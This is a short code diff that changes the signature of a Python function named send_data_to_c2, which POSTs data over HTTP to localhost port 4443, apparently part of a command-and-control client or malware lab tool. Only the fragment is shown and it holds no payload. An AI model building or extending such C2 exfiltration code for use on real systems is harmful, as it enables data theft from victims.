@@ -8,7 +8,7 @@ import os
 HOST = "localhost"
 PORT = 4443
 
-def send_data_to_c2(data, path, headers=None):
+def send_data_to_c2(data, path):
     try:
         conn = http.client.HTTPConnection(HOST, PORT)
         conn.request("POST", path, data.encode('utf-8'))
